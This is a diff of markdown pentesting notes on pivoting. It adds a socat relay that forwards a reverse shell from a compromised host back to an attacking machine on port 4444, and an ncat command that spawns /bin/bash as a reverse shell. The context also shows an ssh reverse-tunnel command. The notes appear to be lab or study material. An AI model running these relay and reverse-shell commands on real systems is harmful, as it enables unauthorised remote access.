@@ -133,8 +133,19 @@ ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
 ```
 
 
-Socat
+## Socat
 
 socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:
 
+### Set up a relay
+```
+socat tcp-listen:8000,fork tcp:10.50.88.33:4444 &
+```
+
+### Set up a reverse shell
+```
+./ncat_sardarji 127.0.0.1 8000 -e /bin/bash
+```
+
+![[Pasted image 20240725165921.png]]
 
